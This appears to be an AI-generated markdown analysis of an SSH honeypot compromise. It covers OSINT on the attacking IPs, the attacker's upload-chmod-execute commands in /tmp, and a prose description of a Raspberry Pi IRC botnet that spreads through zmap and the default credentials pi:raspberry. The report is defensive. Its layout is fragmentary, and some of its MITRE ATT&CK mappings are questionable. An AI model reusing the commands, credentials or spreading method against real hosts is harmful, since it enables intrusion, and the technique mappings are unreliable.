> `Your role is to answer questions about an attack on a Linux honeypot. You will analyze the commands executed, uploaded/downloaded files, HTTP requests, sessionsand other data logged during the attack to understand the methods and goals of the attacker.You will also analyze OSINT data gathered about the attacking IP(s) including: geolocation, open ports, running services, threatfeed reports and reports of known malware associated with the IP(s) to get additional context on the attack and enhance your analysis. Your answers will be used in a GitHub .md file so you should use markdown syntax to format your output. Use the available functions to request relevant information to thoroughly answer each question. You should use multiple function calls to analyze the data returned by previous function calls and to get any additional data you need to answer each question as accurately as possible. For example if you see that the attacker downloaded malware in one of the commands executed, you should use the get_attack_attrs function with the arguement 'uniq_malware' to get a list of unique malware_ids associated with the attack, then use get_malware_attrs to analyze the malware, and the query_ functions to get additional OSINT data about the malware and its source. IMPORTANT: When using get_attack_attrs use the uniq_<attr> modifier first and only get all values if necessary after analyzing the unique values. For context that the honeypot system has the following open ports: Port 2222: Cowrie SSH server running OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)  Its internal IP address is: 172.31.5.68 and its external IP address is: 54.67.87.80. Use the code_interpreter tool to enhance your analysis. For example if you find an encoded string in the http_requests, commands, or malware, you should use the code_interpreter tool to decode it, then analyze the decoded result in context when answering questions.`

  - Matched by 27 out of 42 scanners (64.29% detection rate).
- **Spamhaus HBL:** Detected as suspicious.
- **InQuest:** Verdict rendered as malicious.
- **No Data in ThreatFox and URLhaus:** The hash doesn't appear to have entries in these two databases.

### Malware Hashes: 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 and b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
- No data available from MalwareBazaar, ThreatFox, or URLhaus.

### Analysis:
- **Relevant Hosts:** No specific URLs or hosts were found associated with the malware samples.
- **Known Source IPs:** The malware was downloaded by the following IPs:
  - Malware 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c by 93.223.169.159.
  - Malware 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 by 27.93.25.111.
  - Malware b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f by 111.216.194.148.

The attackers appear to have utilized a known Linux trojan, potentially a shell script, as part of their attack. This malware has signatures that are detected by various antivirus and security tools, indicating its malicious nature. The lack of additional information about the other two hashes suggests that they might be less known or more recently developed samples. No specific exploits were extracted from these datasets, but the indicators suggest the use of trojanized Linux utilities or scripts as part of the attacker's toolkit.

## Prompt: Summarize the critical findings across all OSINT sources.

**Run ID:** `run_YUoU3e82oAWJnP7ue35sENt3`

<details>
<summary>
<h3>Answer</h3>
</summary>

The critical findings across all OSINT sources for the IP addresses and malware involved in the attack on the Linux honeypot can be summarized as follows:

### IP Addresses:
- There were three primary source IPs identified: **93.223.169.159 (Germany), 27.93.25.111 (Japan), and 111.216.194.148 (Japan)**, which were involved in targeting the honeypot server.
- These IPs have been reported engaging in malicious activity, including attacks on other honeypots and SSH brute force attacks.
- They have been listed on various threat feeds and blocklists, suggesting a history of suspicious activities.
- Shodan data showed that at least one of the IPs was running common services like OpenSSH and Apache HTTPD, which could indicate compromised systems being used as part of an attack infrastructure.
- ISC reported that these IPs have repeatedly targeted honeypots, have been active over several months, and are associated with large network providers.

### Malware:
- A Linux trojan with hash **10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c** was identified, distributed by the IP **93.223.169.159**, and has been found on MalwareBazaar.
- The malware was noted for a file size of 4766 bytes and the MIME type `application/octet-stream`, potentially indicating a shell script.
- The malware is detected by ClamAV and was listed as suspicious by Spamhaus HBL.
- ReversingLabs tagged it as "Linux.Trojan.Generic" and flagged it as suspicious with a 64.29% detection rate by scanning services.
- There was no additional data found on ThreatFox or URLhaus for the other two malware hashes, suggesting they might be less known or newly developed samples.

### Attack Methodology:
- Attackers used common usernames and passwords for SSH login attempts, which indicates a likely reliance on default or commonly used credentials.
- The consistent SSH hassh across sessions indicates the use of the same SSH client.
- Sessions included both successful and unsuccessful login attempts.
- Some successful sessions involved command executions and the transfer of malware.

The summary of findings illustrates a coordinated attack likely involving automated scripts or bots to compromise systems using default credentials, followed by the deployment of malware once access was gained. The identified malware points to the use of trojanized utilities or scripts, targeting Linux systems for malicious purposes. The reported activities across these OSINT sources suggest an established threat behavior associated with these actors and their infrastructure.

## Prompt: Explain the commands used and their functions in the context of the attack.

**Run ID:** `run_EfOsQaT3Eyv6fU5pqInNUA4X`

### Funciton Calls
**Step ID:** `step_N9uh0UOUACQfbqVGbJJ6tHeb`

**Function called:** `get_attack_attrs`

| `uniq_commands` | `{'scp -t /tmp/BUwTrLEj', 'cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj', './BUwTrLEj'}` |


<details>
<summary>
<h3>Answer</h3>
</summary>

The commands used during the attack and their functions are:

1. `scp -t /tmp/BUwTrLEj`
   - **Function:** This command uses the `scp` (secure copy) utility with the `-t` option to receive file(s). It is part of the SCP protocol to copy a file to the target directory `/tmp` with the name `BUwTrLEj`. The command is likely executed on the honeypot server and suggests that the attacker attempted to upload a file named `BUwTrLEj` to the `/tmp` directory of the honeypot.

2. `cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj`
   - **Function:** This is a compound command that changes the current directory to `/tmp`, makes the file `BUwTrLEj` executable with `chmod +x`, and then executes it using `bash`. It indicates that after uploading the malicious file, the attacker made it executable and ran the script or binary, which could be the malware or a script for further exploitation.

3. `./BUwTrLEj`
   - **Function:** This command executes the file `BUwTrLEj` which is assumed to be located in the current directory of the attacker's shell session. This is a direct execution command that would be used if the attacker is already in the `/tmp` directory or if the path was included in `$PATH`. The command would trigger whatever payload `BUwTrLEj` contains.

The use of the `/tmp` directory is typical in attacks as it is a world-writable directory and is intended for temporary file storage. This allows an attacker to execute a file with fewer permission issues. The sequence of commands uploaded, granted executable permissions, and attempted execution of a file presumed to be malicious, revealing an attempt to compromise the system through the execution of unauthorized code. This pattern is consistent with a common post-exploitation process where attackers aim to establish a foothold or deliver a payload on compromised systems.

<h3>Answer</h3>
</summary>

The malware that was part of the attack carries out a variety of functions aimed at establishing persistence, executing unauthorized activities, and propagating itself across networks. Below is an explanation of its functioning as extracted from the sample text:

1. **Persistence and Privilege Escalation:**
- Checks for root privileges; if not running as root, it uses `sudo` to copy itself to `/opt/` and modifies `/etc/rc.local` to ensure that it runs on every system startup.
- Issues a reboot command to make sure the changes take effect.

2. **Cleanup and Preparation:**
- Kills a variety of processes, including miners and potential previous instances of itself, indicating it doesn't want to compete for resources.
- Modifies `/etc/hosts` to prevent communication with certain domains (`bins.deutschland-zahlung.eu`).
- Removes `.bashrc` from root and the user `pi` to prevent loading of environment variables.
- Changes the password for the user `pi`.

3. **Maintaining Access:**
- Sets up an SSH key for root, allowing for passwordless access to the compromised machine.
- Adjusts `/etc/resolv.conf` to set the Google DNS server as the nameserver, potentially to ensure network connectivity.

4. **Botnet Functionality:**
- Creates a bot script that generates a semi-random nickname and connects to different IRC servers using hardcoded addresses and joins a specific channel.
- Uses a public key to verify commands received over IRC, executes them, and sends the results back to the sender encoded in base64.
- Runs the bot script in the background to maintain the botnet connection.

5. **Propagation:**
- Installs `zmap` and `sshpass` to facilitate network scanning and SSH brute-force attempts.
- Uses `zmap` to scan for SSH services on port 22 and attempts to copy itself to other systems using common credentials "raspberry" and "raspberryraspberry993311".
- Executes itself on any new machines it manages to transfer to, spreading the infection.

6. **Other Malicious Activities:**
- Contains hardcoded paths and commands for removing other specific malware, suggesting attempts to clean competing infections or traces of its activities.

This malware is sophisticated and multipurpose, built to sustain prolonged access to compromised systems, participate in botnet activities, and self-propagate to other vulnerable machines. It indicates a calculated and extensive compromise, with the attackers orchestrating a systematic network breach and actively seeking to broaden their reach.

<h3>Answer</h3>
</summary>

The search against ExploitDB using the provided texts did not return any specific exploits associated with the text "ssh pi default password," "sudo reboot," "scp -o ConnectTimeout=," or "zmap." This could imply that the attack did not leverage a specific known vulnerability with an assigned CVE number or that the exploit is not listed in the ExploitDB database.

The nature of the attack does not appear to be based on exploiting a single specific software vulnerability but rather on the exploitation of configuration weaknesses such as:

- Use of default or weak passwords for SSH access (a common issue with devices where the default credentials are not changed).
- Misconfigured `sudoers` file allowing unauthorized operations without a password or with a default known password.

The attackers were able to exploit these security misconfigurations to gain unauthorized access, escalate privileges, maintain persistence, and deploy malware. 

In the absence of specific CVEs and exploit code, it's possible that the attack vector was purely based on the exploitation of poor security practices rather than a known software vulnerability. However, it's also worth noting that not all exploits are necessarily present in public databases like ExploitDB, especially if the attack utilizes private or previously undisclosed methods.

## Prompt: How can this attack be classified using the MITRE ATT&CK framework?

**Run ID:** `run_8I9uEi1WLuIQWj2RpC5Lm6cn`

<details>
<summary>
<h3>Answer</h3>
</summary>

The MITRE ATT&CK framework provides a comprehensive matrix of tactics and techniques used by threat actors during the phases of their cyber attack lifecycle. Based on the information gathered about this attack on the Linux honeypot, the following MITRE ATT&CK tactics and techniques can be used to classify the attack:

1. **Initial Access (Tactic TA0001):**
   - **Technique T1078 (Valid Accounts)**: The use of default SSH credentials (username `pi` with passwords `raspberry` and `raspberryraspberry993311`) to gain initial access to the system.

2. **Execution (Tactic TA0002):**
   - **Technique T1059 (Command and Scripting Interpreter)**: The execution of a bash shell script to execute commands and propagate the malware (`./BUwTrLEj`).

3. **Persistence (Tactic TA0003):**
   - **Technique T1068 (Exploitation for Privilege Escalation)**: Attempts to achieve persistence via `sudo` privilege escalation and modifying the system's `rc.local` file for reboot persistence.
   - **Technique T1098 (Account Manipulation)**: Modifying user credentials for the `pi` user to ensure maintained access.

4. **Privilege Escalation (Tactic TA0004):**
   - **Technique T1068 (Exploitation for Privilege Escalation)**: Similar to Persistence, using `sudo` to copy the malware to a privileged directory and ensure execution as root.

5. **Defense Evasion (Tactic TA0005):**
   - **Technique T1027 (Obfuscated Files or Information)**: Likely use of obfuscation or encoding techniques within the malicious script to hide the true intent of the payload.
   - **Technique T1112 (Modify Registry)**: Although not directly touching the Windows Registry, this technique is analogous to the modification of startup scripts in Linux (`rc.local` and `.bashrc` modifications).

6. **Credential Access (Tactic TA0006):**
   - **Technique T1110 (Brute Force)**: Usage of `sshpass` and `zmap` to perform brute force attacks against other SSH servers.

7. **Discovery (Tactic TA0007):**
   - **Technique T1046 (Network Service Scanning)**: Using `zmap` to scan the internet for exposed SSH services (port 22) as potential targets.

8. **Lateral Movement (Tactic TA0008):**
   - **Technique T1021 (Remote Services)**: The SSH login attempts to spread the malware to additional hosts once initial access was obtained.

9. **Collection (Tactic TA0009):**
   - Potentially relevant if data collection activities were identified during the analysis, though none were explicitly mentioned.

10. **Command and Control (Tactic TA0011):**
    - **Technique T1071 (Application Layer Protocol)**: Using IRC as command and control (C2) communication channel.

11. **Exfiltration (Tactic TA0010):**
    - Not explicitly mentioned, but if the script exfiltrated data, it could be included here.

12. **Impact (Tactic TA0040):**
    - **Technique T1485 (Data Destruction)**: The removal of `.bashrc` and other files could be considered a form of data destruction.

This classification covers a broad range of activities from the attack lifecycle, from gaining initial access to maintaining presence on compromised systems and potentially spreading across the network. It highlights the multi-faceted nature of the attack and the various areas where improvements in defensive measures could be implemented.

## Prompt: What is the goal of the attack?

**Run ID:** `run_7U7WKxhSvv1KxNTAcIDIulx5`

<details>
<summary>
<h3>Answer</h3>
</summary>

The goal of the attack on the Linux honeypot appears to be multifaceted, involving several objectives:

1. **Unauthorized Access and Control:**
   - Gain initial access to a system using default or weak SSH credentials. This enables the attacker to execute commands and deploy malware for control over the compromised system.

2. **Persistence and Privilege Escalation:**
   - Establish persistence by adding the malware to startup routines and elevating privileges to maintain long-term access. This suggests intent to secure control over the system across reboots and potential system administration activities.

3. **Malware Deployment:**
   - Install and execute malware to perform unauthorized actions, such as joining a botnet for coordinated activities or performing further malicious operations.

4. **Propagation and Expansion of Attack Surface:**
   - Use the compromised system as a launchpad for scanning and infecting other vulnerable systems on the internet, effectively expanding the botnet or the network of compromised hosts.

5. **Botnet Participation:**
   - Connect to an IRC server and wait for commands, indicating the infected system was part of a botnet, which could be leveraged for various coordinated attacks such as DDoS attacks, spreading spam, or further malware distribution.

6. **Credential Theft and Lateral Movement:**
   - Change the password of the user `pi` to maintain unauthorized access and potentially move laterally across the network by compromising more systems.

7. **Resource Hijacking:**
   - Kill processes related to other malicious activities, suggesting the attacker's intent to free up system resources potentially for cryptocurrency mining or to ensure their malware remains the predominant unauthorized software on the compromised system.

8. **Data Destruction and Defense Evasion:**
   - Modify system files (`/etc/hosts`, `.bashrc`, etc.) and network settings (DNS configuration) to hide their activity and potentially disrupt the normal operation of system utilities and security software.

Overall, the attack exhibits the characteristics of seeking to achieve ongoing unauthorized access, exploit system resources, conduct malicious cyber activities, and potentially perform financial theft or sabotage. The deployment of a botnet functionality also hints at collective capabilities for larger scale nefarious activities orchestrated by the attacker.

## Prompt: If the system is vulnerable, would the attack will be successful?

**Run ID:** `run_GOXMWyYyuIhfTDpp4FJlnbSU`

<details>
<summary>
<h3>Answer</h3>
</summary>

Based on the details of the attack, its success largely depends on the exploitation of weak security practices rather than specific software vulnerabilities. The key factors that could have made the system vulnerable, and thereby susceptible to a successful attack, include:

1. **Default or Weak Credentials:** If the system was using default usernames and passwords (such as `pi:raspberry`), the attacker's brute force or credential stuffing attempts would likely succeed, granting them initial access.

2. **Lack of Proper User Permission Configurations:** If users are improperly configured to have more privileges than necessary, especially the ability to execute commands via `sudo` without authentication, attackers can easily escalate their privileges.

3. **Inadequate Security Monitoring and Response:** Without security monitoring solutions that detect and respond to unusual activity (such as multiple failed login attempts or the sudden addition of SSH keys), the attack could proceed unnoticed.

4. **Exposure to Internet:** If services like SSH are unnecessarily exposed to the internet, especially with weak credentials, the risk of a successful attack increases significantly.

5. **Insufficient Host-based Security Controls:** Lacking firewalls, access controls, and file integrity monitoring can leave a system exposed to changes in critical files like `.bashrc` or `/etc/rc.local`, which attackers can exploit to establish persistence.

6. **Failure to Isolate and Segment Networks:** If the system is directly accessible from the internet without being segmented or isolated within a network, it's easier for attackers to move laterally after compromising the system.

7. **Unrestricted Outbound Connections:** If the network allows unrestricted outbound connections, it can be used by the malware to connect to external command and control servers, as seen with the IRC server connection.

In the absence of these vulnerabilities, the system's security measures would likely prevent at least some stages of the attack from being successful. For example, strong, unique credentials would prevent initial SSH access, proper user privilege configurations would stop unauthorized `sudo` actions, and active monitoring would detect and potentially stop malicious activities.

Even if a system has technical vulnerabilities, it may not fall victim to an attack if it has robust security policies and practices in place. This includes regular security audits, the principle of least privilege for user accounts, network segmentation, use of intrusion detection and prevention systems (IDS/IPS), timely patch management, and comprehensive monitoring and response strategies.

## Prompt: How can a system be protected from this attack?

**Run ID:** `run_fo1SCjRSHqu8Vh2bC8mQMQkR`

<details>
<summary>
<h3>Answer</h3>
</summary>

To protect a system from this type of attack, multiple security measures should be implemented, focusing on prevention, detection, and response. Here are some ways to safeguard a system:

1. **Use Strong, Unique Credentials:**
   - Implement strong password policies and avoid using default credentials.
   - Regularly rotate passwords and encourage the use of password managers.

2. **Implement Two-Factor Authentication (2FA):**
   - Enable 2FA wherever possible to add an extra layer of security on top of passwords.

3. **Privilege Management:**
   - Practice the principle of least privilege, ensuring users have only the necessary access rights.
   - Restrict `sudo` privileges and monitor `sudoers` file changes.

4. **Regularly Update and Patch Systems:**
   - Keep all system software up to date with the latest security patches to mitigate known vulnerabilities.

5. **Harden SSH Configuration:**
   - Disable root login over SSH.
   - Use SSH keys for authentication rather than passwords, if possible.
   - Limit SSH access to known IP addresses through firewall rules or SSH configuration.

6. **Network Security:**
   - Use firewalls to block unnecessary inbound and outbound connections.
   - Implement network segmentation to isolate critical systems and limit lateral movement.
   - Monitor network traffic for abnormal patterns that could indicate an attack.

7. **Host-Based Security Measures:**
   - Install and configure intrusion detection systems (IDS) and intrusion prevention systems (IPS).
   - Use security software to monitor for and quarantine suspicious files.
   - Regularly scan systems for malware and vulnerabilities.

8. **File Integrity Monitoring:**
   - Implement tools to monitor critical system files for unauthorized changes.

9. **User Activity Monitoring:**
   - Monitor and alert on suspicious user activities, such as multiple failed login attempts or unexpected privilege escalations.

10. **Backup and Disaster Recovery:**
    - Maintain regular and secure backups of critical data.
    - Develop and test a disaster recovery plan to ensure business continuity in case of a successful breach.

11. **Security Training and Awareness:**
    - Provide regular security training to all users, focusing on recognizing and reporting phishing attempts, malware, and other security threats.

12. **Incident Response Plan:**
    - Establish and periodically test an incident response plan to quickly and effectively handle potential security breaches.

Implementing these measures can significantly reduce the risk of a successful attack, both from the specific techniques used in this scenario and from a broad range of other potential vulnerabilities and threat actors.
